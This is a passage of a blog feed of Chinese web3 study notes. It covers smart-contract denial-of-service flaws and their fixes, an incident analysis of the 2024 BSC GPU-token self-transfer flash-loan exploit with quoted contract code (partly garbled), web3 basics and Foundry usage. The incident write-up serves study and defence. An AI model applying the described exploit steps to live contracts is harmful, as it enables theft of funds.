        <content type="html"><![CDATA[<h3 id="拒绝服务（DOS）攻击"><a href="#拒绝服务（DOS）攻击" class="headerlink" title="拒绝服务（DOS）攻击"></a>拒绝服务（DOS）攻击</h3><h3 id="未设定gas费率的外部调用"><a href="#未设定gas费率的外部调用" class="headerlink" title="未设定gas费率的外部调用"></a>未设定gas费率的外部调用</h3><p> 在以太坊中，每一笔交易都会携带一定数量的Gas，这是为了确保任何执行的操作都不会消耗过多的计算资源，从而避免网络拥堵或资源耗尽。当一笔交易开始执行时，它会从交易者提供的Gas总量中扣除费用，直到合约执行完成或Gas耗尽。如果在执行过程中Gas耗尽，那么交易将被回滚，且已经消耗的Gas不会退还给用户。</p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   1， 攻击者可以通过构造高复杂度的交易或智能合约来故意消耗大量的Gas，从而正常交易无法被包含在区块中。例如，攻击者可以创建一个合约，该合约在接收到消息时执行大量计算或存储操作，消耗接近最大Gas限额的Gas量。当许多这样的交易被同时发送到网络时，它们会占据大部分甚至全部的Gas容量，导致其他用户的正常交易无法被确认，从而达到拒绝服务的效果。<br>   2，使智能合约进入无限循环，这将导致Gas立即耗尽，交易失败并回滚。这种攻击通常发生在合约逻辑中存在错误的情况下，例如没有正确处理循环退出条件，或在递归调用中缺少终止条件。当合约进入无限循环时，它会尝试消耗所有可用的Gas，最终导致交易失败，并可能使合约处于不可用状态。</p><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p><h3 id="依赖外部的调用进展"><a href="#依赖外部的调用进展" class="headerlink" title="依赖外部的调用进展"></a>依赖外部的调用进展</h3><h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><pre><code>这种情况是由于合约没有正确处理外部调用。例如，如果合约依赖于外部函数执行的结果，但合约没有对外部函数执行失败进行处理，此时如果外部调用失败或者由于外部原因而被拒绝时，会导致每次执行交易时都会因为这个失败问题导致交易回滚，合约无法继续执行。</code></pre><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>   在竞拍合约中，出价者高成为king，并把上一位king的钱transfer回去，但是如果上一位king并不能接受钱的话,那么他就会一直成为king，就相当于拒绝其他人的出高价竞拍</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>   在竞拍合约中尽量让合约参与者自提参与竞拍的token，其次如果确实需要对外部函数调用的结果进行处理才能进入新的状态，请考虑外部调用可能一直失败的情况，也可以添加基于时间的操作，防止外部函数调用一直无法满足require判断。</p><h3 id="Owner的错误操作"><a href="#Owner的错误操作" class="headerlink" title="Owner的错误操作"></a>Owner的错误操作</h3><h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   这种拒绝服务攻击就是建立在后期运营情况下，在智能合约中通常会存在以 Owner 账户作为管理员角色，该角色通常会持有很高的权限，例如开启或暂停转账功能，当 Owner 角色操作失误或私钥丢失可能会受到非主观意义上的拒绝服务攻击。</p><h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   建议设计多个owner地址，避免密钥遗失等问题发生时，导致合约被锁，同时一个综合系统中只有一个绝对权限的管理员是极其不安全的。</p><h3 id="数组或映射过长"><a href="#数组或映射过长" class="headerlink" title="数组或映射过长"></a>数组或映射过长</h3><h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><pre><code>当合约中存在对传入的映射或数组循环遍历的逻辑且没有限制传入的映射或数组的长度时攻击者可以通过传入超长的映射或者数组进行循环遍历而大量消耗 Gas 从而该笔交易的 Gas 溢出，最后使得智能合约暂时或永久不可操作。</code></pre><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>  在利益分发合约中，类似于公司给股东分红，如果员工人数过于多，即数组过大会导致操作执行的gas远远超于上限，从而导致交易失败，也就无法分红</p><h4 id="解决方法：-2"><a href="#解决方法：-2" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   避免需要循环操作的数组或映射能够被外部调用，同时在合理的增长过程，可以采用分区块处理的方式，避免数组或映射过大失败。</p><h3 id="依赖库的问题"><a href="#依赖库的问题" class="headerlink" title="依赖库的问题"></a>依赖库的问题</h3><h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>  Parity 钱包遭受的第二次攻击是一个很好的例子。Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。攻击者就调用初始化函数把自己设置为库函数的owner，在调用kill（）函数，把库合约删除，所有的ether就被冻结了</p><h4 id="解决方法：-3"><a href="#解决方法：-3" class="headerlink" title="解决方法："></a>解决方法：</h4><p>  继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击描述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20240508 BSC攻击事件分析</title>
      <link href="/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="BSC攻击事件分析"><a href="#BSC攻击事件分析" class="headerlink" title="BSC攻击事件分析"></a>BSC攻击事件分析</h2><p>这是一起发生在2024年5月8日币安智能链（BSC）上的闪贷攻击事件，影响的是GPU代币合约。该合约存在自转账漏洞，每次自转账都会导致资产翻倍。黑客利用该漏洞，通过DODO协议以闪贷的方式借入BUSD，在PancakeSwap上兑换成GPU代币，再利用漏洞进行多次自转账，导致其GPU代币余额增加了100亿倍，达到28,070,259,409,924枚代币。最后，黑客将GPU代币卖出换成BUSD，用于偿还闪贷本息，最终窃取约3.2万美元资金。</p><p>首先攻击者从DODO借贷协议中发起闪电贷，借出BUSD到攻击合约地址，攻击者合约在调用PancakeSwap协议，将借出的BUSD兑换成GPU代币，利用自我转账漏洞，凭空产生CPU代币，攻击者合约自己给自己转账，每转账一次，GPU资产就会翻倍，攻击者合约将获取到的GPU代币发送到PancakeSwap V2协议中，换取BUSD。然后攻击者从PancakeSwap V2协议中获取的BUSD，将其中的一部分用于返还DODO借贷协议的本金和利息，剩下的都是攻击者所获得的。</p><p>完整的调用信息看<a href="https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb?line=6">这里</a></p><p>下面是DODO协议中借贷协议中的借贷函数<strong>flashLoan</strong>的部分信息，用于从DODO协议资金池中借贷指定数量的资产，这里的参数baseAmount为零，而quoteAmount为226007，表示借贷这么多个BUSD，assetTo为攻击者合约地址，data则在回调函数中使用到<br>简单的讲该函数分为3个部分，第一个部分讲资产发送到目标地址，第二部分执行目标地址的回调函数，通常用于实现套利逻辑，第三部分校验是否归还本利息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">        uint256 baseAmount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        address assetTo,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external preventReentrant &#123;</span><br><span class="line">    // step1 transfer token to target address</span><br><span class="line">        _transferBaseOut(assetTo, baseAmount);</span><br><span class="line">        _transferQuoteOut(assetTo, quoteAmount);</span><br><span class="line"></span><br><span class="line">// step2 callback function</span><br><span class="line">        if (data.length &gt; 0)</span><br><span class="line">            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);</span><br><span class="line"></span><br><span class="line">        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));</span><br><span class="line">        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        // step3 check balance</span><br><span class="line">        require(</span><br><span class="line">            baseBalance &gt;= _BASE_RESERVE_ || quoteBalance &gt;= _QUOTE_RESERVE_,</span><br><span class="line">            &quot;FLASH_LOAN_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // ...;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>PancakeRouter</strong>合约，该合约主要用于BUSD和GPU代币的兑换，由于GPU合约会在兑换环节中收取手续费，兑换的另一个代币数量可能无法提前准确计算，因此这里使用了下面的<strong>swapExactTokenForTokensSupportingFeeOnTransferTokends函数</strong>，参数<strong>amountln</strong>表示往池子里存入的代币数量，而参数<strong>amountOutMin</strong>表示从池子里取出来另一种代币的最小数量，<strong>path</strong>代表代币的兑换路径，如 <strong>[address(A),address(B)]<strong>表示A代币兑换成B代币，参数</strong>to</strong> 表示兑换出来的代币转入目标地址，<strong>deadline</strong>为兑换有效日期<br>该函数简单分为以下几个部分，第一部分把A代币转入相应的池子中，第二部分通过**_swapSupportingFeeONTransferTokens函数<strong>计算B代币的数量并转给</strong>to<strong>地址，第三部分判断得到的B代币数量是否满足</strong>zamountOutMin**的要求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">    uint amountIn,</span><br><span class="line">    uint amountOutMin,</span><br><span class="line">    address[] calldata path,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) &#123;</span><br><span class="line">// step1 transfer A token to pool</span><br><span class="line">    TransferHelper.safeTransferFrom(</span><br><span class="line">        path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn</span><br><span class="line">    );</span><br><span class="line">    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);</span><br><span class="line">    </span><br><span class="line">    // step2 calculate and transfer B token</span><br><span class="line">    _swapSupportingFeeOnTransferTokens(path, to);</span><br><span class="line">    </span><br><span class="line">    // step3 check B token amount</span><br><span class="line">    require(</span><br><span class="line">        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin,</span><br><span class="line">        &#x27;PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPU是一个普通的ERC20代币，他的转账函数如下，这里并没有进行<strong>from</strong> 和<strong>to</strong>的是否相等的判断，实际的转账逻辑正发生在父合约中，正是如此，这个漏洞很少被发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">  address from, address to, uint256 amount) internal override &#123;</span><br><span class="line">   require(from != address(0)，&quot;ERC20: transfer from the zero address&quot;); require(to != address(0)，&quot;ERC20: transfer to the zero address&quot;); require(amount&gt;0);</span><br><span class="line">   &#125;</span><br><span class="line">   if(_isExcludedFromFeesVip[from] || _isExcludedFromFeesVip[tol])&#123;</span><br><span class="line">    super._transfer(from, to, amount);You, 2 days ago &quot; add demo</span><br><span class="line">      return;</span><br><span class="line">       if(super.balance0f(address(this)) &gt;super.balance0f(uniswapV2Pair).div(2000))&#123;</span><br><span class="line">           if (_isExcludedFromFees[from] || _isExcludedFromFees[tol]) &#123;&#125; else &#123;</span><br><span class="line">                if(_isPairs[from])&#123;</span><br><span class="line">                      require(startTime &lt; block.timestamp,&quot;startTime&quot;);</span><br><span class="line">                     if(startTime.add(18 * 30 *86400) &gt; block. timestamp)&#123;</span><br><span class="line">                     super._transfer(from, _destroyAddress, amount.div(100).mul (2)); super._transfer(from, address(this)，amount.div(100).mul(1)); amount = amount.div(100).mul(97);</span><br><span class="line">                     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而父合约的_<strong>tranfer</strong>函数，也没有进行<strong>from</strong> 和<strong>to</strong> 是否相等的检查，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address sender,address recipient,uint256 amount )internal virtual &#123;</span><br><span class="line"></span><br><span class="line">       (requirelsender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">      (require(recipient != address(0),&quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">          uint256 senderAmount = _balances [sender];</span><br><span class="line"></span><br><span class="line">          uint256 recipientAmount = _balances [recipient];</span><br><span class="line"></span><br><span class="line">          (requirelsenderAmount &gt;= amount,&quot;ERC20:transfer amount exceeds balance&quot;);</span><br><span class="line">  </span><br><span class="line">          _balances [sender]= senderAmount. sub(amount);</span><br><span class="line"></span><br><span class="line">          _balances[recipient] = recipientAmount.add(amount);</span><br><span class="line"></span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从以上代码我们可以看见，，在进行 transfer 时，先保存 from 和 to 的 balance 到变量 senderAmount 和 recipientAmount，随后计算转账后的 senderAmount 和 recipientAmount 的值，最后在更新到 balances 中。但是，当 from 和 to 为同一地址时，先更新 from 再更新 to 其实就是给 to 凭空添加了 amount 数量的 token。所以，攻击者通过持续给自己转账从而让自己的GPU Token凭空增多。</p><p>这个攻击成功就是利用了自我转账的漏洞，我认为要防御的话加个对转账地址和被转账地址是否相等的条件</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web3学习知识</title>
      <link href="/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>最近又发现一个学习网站，正好趁着国庆假期，再把知识又巩固一遍，就写了这篇学习学习笔记记录一下</p><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>以前我们的信息都集中在一个软件上，这造成了，我们的信息就会被泄露，就比如2018年Facebook-剑桥分析公司数据泄露丑闻，数百万Facebook用户的个人信息被不当收集并用于影响政治选举，这就是数据集中控制的风险和后果</p><p>那么web3就出现了，它是建立在区块链技术上的下一代互联网，它强调<strong>权力下放</strong>，这就意味着没有集中的权威机构来管理数据和资源</p><p>在web3的世界里，用户拥有自己创立的内容和数据，摆脱了对传统中心化平台的依赖，由此web3也促进了新的商业模式，例如：<strong>去中性化金融（DeFi）</strong>   <strong>非同质化代币（NFT）</strong>  <strong>去中性化自治组织（DAO）</strong></p><p>它的发展来看：从Web1.0时代的静态网页，到Web2.0的社交互动，再到Web3.0的去中心化智能网络</p><p>Web3 各赛道百花齐放，共同构建一个去中心化、透明化、创新化的数字生态。去中心化金融（DeFi）消除了中介机构，实现了开放式的金融交易和服务；非同质化代币（NFT）赋予了数字资产唯一性和价值；去中心化自治组织（DAO）促进了集体决策和公平管理；去中心化身份（DID）保障了个人身份数据的安全和隐私；社交金融（SocialFi）和游戏金融（GameFi）将传统的社交、游戏活动与经济激励相结合，重新定义了用户参与的价值；基础设施赛道为所有这些创新提供了稳定的技术支持和发展平台。</p><h2 id="web3领域的知识"><a href="#web3领域的知识" class="headerlink" title="web3领域的知识"></a>web3领域的知识</h2><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>加密和解密使用同样的密钥，这样就必须双方知道密钥，并且都保证不向外传，但是这样的保密性不高，只要有人得到了密钥，就能解密</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>就是一个人，有俩个密钥，一个公钥，一个私钥，下面将详细解释</p><h3 id="公钥和私钥"><a href="#公钥和私钥" class="headerlink" title="公钥和私钥"></a>公钥和私钥</h3><p>私钥：私钥是随机生成的字符串，通常由一系列字母和数字组成，是用户身份和资产管理的核心，必须严格保密。<br>公钥:公钥由私钥生成，是私钥的配对密钥，可以公开共享，用于验证信息和加密私钥签名的数据。<br>以前没有分清楚公钥和私钥的作用，现在我明白了，就举个例子吧<br>A向B发送一个交易，首先A获得B的公钥，用来对交易加密，B收到交易后用他自己的私钥进行解密，但是公钥是公开的，谁都可以用B的公钥加密交易，冒充A给B发，所以就有数字签名出现了，A在发送消息前用自己的私钥先对交易签名，生成v,r,s,B接受到消息后就可以使用A的公钥进行解密，这使用了非对称加密和数字签名的技术</p><h3 id="defi"><a href="#defi" class="headerlink" title="defi"></a>defi</h3><p>去中心化金融（简称 DeFi）是一种基于区块链技术的金融生态系统。它利用智能合约（可自动执行的程序代码）实现金融服务自动化，同时消除传统金融系统中的银行和经纪人等中介机构。在 DeFi 的世界里，所有交易和服务都是透明的、无需许可的，并且对任何有互联网访问权限的人开放</p><p>与传统的中心化金融（CeFi）相比，去中心化金融在可及性、透明度、安全性、效率、创新性和去中心化方面具有显著优势。</p><ul><li>首先，DeFi 提供无边界金融服务，确保全球用户只要有互联网连接就可以不受地域限制地进行交易。这对于传统银行服务不足或无法使用的地区尤为重要。</li><li>其次，DeFi 利用区块链技术公开记录所有交易，任何人都可以验证和审计这些记录。这种开放性大大提高了系统的透明度和可信度，使用户能够清楚地看到资金的流向，从而减少了隐藏的费用和潜在的不当行为。</li><li>在安全性方面，DeFi 通过先进的加密技术保护用户的资金和交易，大大降低了欺诈和黑客攻击的风险。自动化智能合约还可以确保无缝执行交易，而无需传统金融机构典型的复杂程序和人工审核，从而提高运营效率。</li><li>在创新方面，DeFi 的开放开发平台吸引了来自世界各地的开发者，推动了新的金融产品和服务不断涌现。这种以社区为主导的开发模式鼓励思想交流和快速迭代，加速了金融领域的技术进步。</li><li>最后，与可能面临宕机风险的传统金融机构不同，DeFi 的分布式结构本质上消除了单点控制，增强了系统对故障和攻击的抵御能力。即使某些节点受到攻击，网络仍可持续运行，确保金融服务的连续性和稳定性。<br>一些经典的defi项目，我之前有写过笔记，可以去了解一下</li></ul><h3 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h3><p>在深入研究非同质化代币（NFT）之前，我们需要了解“可同质化”和“不可同质化”的概念。在加密货币的世界里，可互换性意味着可互换性。例如，如果你有 1 个 BTC，我也有 1 个 BTC，即使这两个 BTC 可能位于不同的钱包地址，但它们具有相同的价值，可以直接交换。这就像用一张 100 美元的钞票换另一张相同面值的钞票一样。另一方面，非同质化意味着独特性和不可替代性。非同质化代币 (NFT) 就是这样独特且不可互换的数字资产。NFT 通常用于证明数字艺术品、收藏品等资产的所有权。</p><p>与同质化代币相比，非同质化代币（NFT）在所有权验证、唯一性、收藏价值、市场流动性和参与度等方面具有独特的价值：</p><ul><li>首先，作为区块链技术的产物，NFT 为数字资产提供了不可篡改的所有权证明。这意味着艺术家和内容创作者可以确保他们的原创作品得到合法认证和追踪，从而保护他们的知识产权。</li><li>其次，由于每个 NFT 都是不可替代的，其固有的稀缺性成为其重要的价值来源。这种稀缺性，尤其是对于独特的艺术品而言，赋予了 NFT 极高的收藏价值。</li><li>此外，尽管 NFT 不可替代，但它们仍可以在全球多个平台上买卖和交易，从而为其提供流动性。随着市场的不断增长，这种流动性正在稳步增加。</li><li>最后，一些 NFT 项目允许持有者对项目的发展进行投票或提供社区特定的福利。这增强了用户体验，使 NFT 不仅仅是一种收藏品，而是一个拥有社区和生态系统的活跃项目。</li></ul><h3 id="DAO"><a href="#DAO" class="headerlink" title="DAO"></a>DAO</h3><p>一个去中心化自治组织（DAO）是基于区块链技术的组织形式，通过智能合约自动执行组织的规则和决策。与传统公司不同，DAO 缺乏管理层和中央权威；所有决策都通过成员投票或预定算法做出。成员通常持有赋予他们投票权的代币，使他们能够直接参与组织的治理，例如提出提案、决定项目方向和分配资金。</p><p>与传统公司相比，DAO 在透明度、信任要求、运营效率、参与式民主和安全性方面具有显著优势。</p><ul><li>首先，DAO 内的所有决策过程和金融交易都公开记录在区块链上，任何外部审计师都可以轻松验证，从而提高了组织的透明度。</li><li>其次，DAO 内部成员之间的交互是通过代码来实现的，成员​​只需要信任智能合约代码本身，而不需要像传统公司那样信任个别领导或者一个中心化的团队。</li><li>此外，由于智能合约可以自动执行任务，这减少了手动处理的需要，消除了许多不必要的中介，并提高了组织运营的效率。</li><li>此外，DAO 允许每个持有代币的成员参与决策，促进更加民主的决策过程，并确保组织真正由社区成员驱动。</li><li>最后，区块链技术的使用增强了 DAO 的安全性，因为它依靠加密和共识算法来保护数据和资产，从而在很大程度上防止外部攻击和内部滥用。</li></ul><h3 id="Web3钱包"><a href="#Web3钱包" class="headerlink" title="Web3钱包"></a>Web3钱包</h3><p>Web3 钱包是一种专为与 Web3 技术（去中心化网络）集成而设计的数字货币钱包。与传统数字货币钱包不同，Web3 钱包允许用户与去中心化应用程序 (DApp) 交互、签署交易并管理其加密资产，而无需依赖中心化第三方。这些钱包通常支持多种加密货币，并提供安全的私钥管理功能，以确保用户资金的安全。</p><p>在 Web3 世界中，一些流行的钱包应用程序因其安全性、易用性和功能性而脱颖而出，成为用户的首选。以下是一些流行的 Web3 钱包：</p><ul><li>MetaMask：MetaMask 是最著名的以太坊钱包之一。它是一个浏览器扩展和移动应用程序，允许用户在网络浏览器中轻松访问以太坊 DApp 并管理其加密资产。</li><li>Trust Wallet：Trust Wallet 是一款安全的移动钱包应用程序，支持多种加密货币，包括以太坊和比特币。它提供了用户友好的界面，并支持与 DeFi 应用程序集成。</li><li>Coinbase 钱包：Coinbase 钱包是加密货币交易平台 Coinbase 推出的一款钱包应用，支持以太坊和 ERC-20 代币，内置 DApp 浏览器。</li><li>币安链钱包：币安链钱包是加密货币交易平台币安推出的钱包应用，旨在兼容币安智能链（BSC）并支持多种加密货币和DApp。</li><li>Trezor：Trezor 是一款以高安全性和便携性著称的硬件钱包。它支持多种加密货币，包括比特币和以太坊，是安全存储加密资产的理想选择。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF区块链技术与应用创新竞赛</title>
      <link href="/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/"/>
      <url>/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="参赛队伍最多4人，需要一名指导老师"><a href="#参赛队伍最多4人，需要一名指导老师" class="headerlink" title="参赛队伍最多4人，需要一名指导老师"></a>参赛队伍最多4人，需要一名指导老师</h3><h3 id="报名时间：截止到2024年9月30号"><a href="#报名时间：截止到2024年9月30号" class="headerlink" title="报名时间：截止到2024年9月30号"></a>报名时间：截止到2024年9月30号</h3><h3 id="提交作品：截止到2023年10月31号-网址https-btc-ccf-org-cn"><a href="#提交作品：截止到2023年10月31号-网址https-btc-ccf-org-cn" class="headerlink" title="提交作品：截止到2023年10月31号 网址https://btc.ccf.org.cn"></a>提交作品：截止到2023年10月31号 网址<a href="https://btc.ccf.org.cn/">https://btc.ccf.org.cn</a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>foundry的使用和安装</title>
      <link href="/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/"/>
      <url>/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>上次那个<a href="https://updraft.cyfrin.io/">网站</a>,里面有讲foundry，虽然以前学习过，但是还是没能具体学习过，只会一些测试的用法，其他高深的用法还没有了解到，借此机会再次学习一下，就写了这个笔记</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>推荐这个网站<a href="https://book.getfoundry.sh/">Foundry-Book</a>;<br>安装完成后，在终端使用指令：Forge –version 查看有没有安装好，如果没有，就删除从头再来一遍</p><p>我们使用的是windows的系统就要去找属于window安装教程（我就反复安装，吃了很多亏），如果你想使用windows上的子系统Linux,就可以在你的终端使用 wsl –install ,然后重启安装即可</p><h2 id="使用-（forge-）"><a href="#使用-（forge-）" class="headerlink" title="使用 （forge ）"></a>使用 （forge ）</h2><p>最开始我还没有了解到怎么自己用Foundry全是从仓库 git clone 下来，它自带Foundry,就不需要自己构建文件夹。现在就介绍一下怎么构建一个文件夹包含Foundry测试框架。（注意我们使用的是VSCODE这个软件，非常好用）</p><ul><li>首先创建一个文件夹，在git base终端上输入 forge init 文件夹名字</li><li>进入文件夹 cd 文件夹名字 </li><li>再构建项目 forge build 或则 forge compile</li><li>测试时使用 forge test 如果要测试，测试合约中的一个测试函数，是可以使用过滤条件方法：forge test –match-contract 测试合约名 –match-test 测试函数,也可以使用路径测试$ forge test –match-path test&#x2F;ContractB.t.sol</li></ul><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><p>一些Cast的指令：</p><ul><li>获取当前链的ID：cast chain-id</li><li>获取当前客户端版本：cast client</li><li>获取当前gas价格：cast gas-price</li><li>查询最新的区块号：cast block-number</li><li>获取当前的网络基础费：cast basefee</li><li>获取block的详细信息：cast block</li><li>获取区块的时间戳信息：cast age</li><li>查询特定的以太坊账户地址：cast balance 地址   如果不知道地址，就使用ENS查询：cast balance vitalik.eth</li><li>查看源代码：cast etherscan-source 地址</li></ul><h2 id="anvil"><a href="#anvil" class="headerlink" title="anvil"></a>anvil</h2><p>它可以提供一个方便测试和开发的以太坊节点<br>使用anvil指令，它可以输出账户，私钥，链ID，基本费用等<br>通过使用anvil-h,可以查看anvil所有的配置选项<br>使用anvil -a 数量，可以生成指定的数量开发账户</p><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chisel是一个Solidity REPL,用于编写和测试Solidity代码片段，它提供了一个用于编程和执行ASolidity代码的交互式环境</p><h2 id="Forge-Std"><a href="#Forge-Std" class="headerlink" title="Forge Std"></a>Forge Std</h2><p>它是Forge标准库，为Foundry框架提供了丰富的辅组合约，简化和加速编写智能合约测试的过程并提升用户体验<br>使用Forge Std 只需要在测试合约导入Test.sol并继承Test</p><p>核心功能：<br>访问Hevm:通过vm实例直接使用，cheatcode模拟各种区块链状态和行为</p><blockquote><p>Hevm是DappHub团队开发的以太坊虚拟机实现，专门用于测试和调试智能合约，它是一个命令行工具，可以模拟以太坊网络的行为，允许开发人员在本地执行测试和调试它们的合约，而无需连接到实际的以太坊网络<br>断言和日志：从Dappsys Test 继承，具有断言功能和一Hardhat为风格的日志记录<br>标准库功能：Forge Std 提供的标准库包括各种实用的工具和功能，例如，向指定账户发送代币</p></blockquote><p>在Forge标准库的测试合约中，通过vm实例可以方便的访问作弊码<br>例如：身份转化：vm.prank;使用vm.prank()函数，我们可以暂时切换调用者的身份</p><h2 id="编写测试合约"><a href="#编写测试合约" class="headerlink" title="编写测试合约"></a>编写测试合约</h2><p>必要工作，导入：import “forge-std&#x2F;Test.sol”<br>setUP函数，是一个可选函数，在运行测试用例之前调用，用于初始化测试环境<br>以test为前缀的函数将被识别为测试用例并执行<br>testFail函数，用于指示预期的测试失败，如果此函数未触发还原，则测试失败</p><p>还有一些高级的测试技术：expectRevert：它是进行精准的错误处理，例如,vm.expectRevert(Some.Error.selector) &#x2F;&#x2F;可触发SomeError一些错误</p><p>共享设置：通过创建抽象合约并在测试合约中继承它，可以设置共享：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract contract SetupHelper &#123;</span><br><span class="line">    // Shared setup codes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyTest is Test, SetupHelper &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // Shared setup</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过共享设置可以避免在每个测试合约中重复相同的初始化代码，提高代码的可重用性和可维护性</p><p>导入文件，用<br>import “forge-std&#x2F;Test.sol”<br>这个是必要的</p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链知识巩固</title>
      <link href="/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/"/>
      <url>/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/</url>
      
